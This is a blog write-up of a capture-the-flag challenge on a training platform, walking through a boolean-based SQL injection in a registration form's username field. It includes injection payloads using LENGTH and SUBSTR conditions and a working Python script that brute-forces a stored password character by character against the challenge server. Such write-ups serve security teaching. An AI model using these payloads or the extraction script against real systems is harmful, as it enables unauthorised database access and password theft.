---
layout: post
title: Infinity - SQL Injection - Username
date: 2026-05-20 00:04:00 +0000
categories: [Writeups, Infinity, "SQL Injection"]
tags:
  - Infinity
author: mustafa_altayeb
subtitle: Manipulating POST Parameters for High Score
description: A walkthrough of exploiting Boolean-based SQL Injection in a registration form on Infinity platform. By crafting true/false conditions and automating character extraction with Python, we recovered user passwords from the database.
image: https://infinitylearning-images.s3.eu-west-2.amazonaws.com/images/public/Web-Application-Badge.png
tag:
  - Infinity
  - Web_Security
  - SQLI
  - infinity
  - CTF
  - Web
  - HTTP
  - POST
  - SQLi
paginate: true
---

# Infinity — SQL Injection: Username

## Overview

A walkthrough of exploiting Boolean-based SQL Injection in a registration 
form on Infinity platform. By crafting true/false conditions and automating 
character extraction with Python, we recovered user passwords from the database.

**Vulnerability:** Boolean-based SQL Injection  

---
## Step 1: Identify the Input Field

Open the challenge and locate the Login form input field.

![alt text](/assets/infinity/SQLI/username/image.png)


---

## Step 2: Test for SQL Injection

I try user name admin and it's taken and tried to inject `'` "`" and no error appear so that i go to use Boolean Based : 

![alt text](/assets/infinity/SQLI/username/image-1.png)

first let's imagine sql query : 
```sql
SELECT * FROM users WHERE (username = 'username')"
```

so if i need to inject in username field i need to put `')` and write new condition like `AND 1=1` : 
![alt text](/assets/infinity/SQLI/username/image-2.png)

here appear to be Boolean based SQLi : 
![alt text](/assets/infinity/SQLI/username/image-3.png)

here when we make the condition (1=2) and it's false we received username is available when try  1=1 and it's true so that we received username is already taken we can see that our condition is work so that inject more complex conditions to retrieve password length and the password

---

## Step 3:  Try to get Password length

By Using function `LENGTH` we can retrieve password length if the result user available it's wrong length and if username already taken it's valid length 

![alt text](/assets/infinity/SQLI/username/image-4.png)


From here i know password length the password can be extracted character by character. Character Extraction Payload 
`admin') AND SUBSTR(password,1,1)='a' AND ('1'='1`  this manual  but i will create python script to try chars from a to z and 0 to do this all 

```python
#!/usr/bin/env python3

import requests

url = "http://173.208.132.134:30238"
mark = "Username already exists"  # marker to know whether the user exists
chars = "abcdefghijklmnopqrstuvwxyz1234567890"

length = int(input("Password length: "))

password = ""

for i in range(1, length + 1):
    for c in chars:
        payload = f"admin') AND SUBSTR(password,{i},1)='{c}' AND ('1'='1"

        response = requests.post(
            url,
            data={"username": payload}
        )

        if mark in response.text:
            password += c
            print(f"[+] {i}: {c} -> {password}")
            break

print(f"\nRecovered password: {password}")
```

![alt text](/assets/infinity/SQLI/username/image-5.png)

and got the password correctly 
 
for user `priya` change user name in the script :


## Key Takeaways

- Always test `'` and `"` first — even if no error appears, the app might still be vulnerable.
- When there's no visible output, look for behavioral differences — "username taken" vs "available" is enough to build a full attack on.
- Automating character extraction with Python saves hours — manual `SUBSTR` testing is impractical on real passwords.

---

Happy Hacking!  


Follow me: [LinkedIn](https://www.linkedin.com/in/t4t4r1s/) · [X](https://x.com/T4T4R1S)

<iframe src="https://tryhackme.com/api/v2/badges/public-profile?userPublicId=3186403" style="border:none;"></iframe>


